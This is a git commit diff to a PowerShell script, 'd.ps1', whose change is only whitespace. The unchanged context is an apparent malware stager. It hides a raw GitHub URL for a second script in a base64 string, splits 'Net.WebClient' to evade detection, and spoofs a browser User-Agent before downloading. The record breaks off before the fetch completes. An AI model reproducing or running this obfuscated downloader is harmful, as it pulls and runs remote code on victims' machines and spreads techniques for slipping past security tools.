917d6cc624147f7ff9b538deb4be51a62ae646e3
jktvz <admininfogathering@proton.me>
2026-02-17 00:58:28 +0300

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -2,7 +2,8 @@ $v = 1
 if ($v -eq 1) {
     try {
         $u = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBrAHQAdgB6AC8ASgAvAG0AYQBpAG4ALwBhAC4AcABzADEA'))
-                $t = "Net.Web" + "Client"
+        
+        $t = "Net.Web" + "Client"
         $o = New-Object $t
         $o.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         
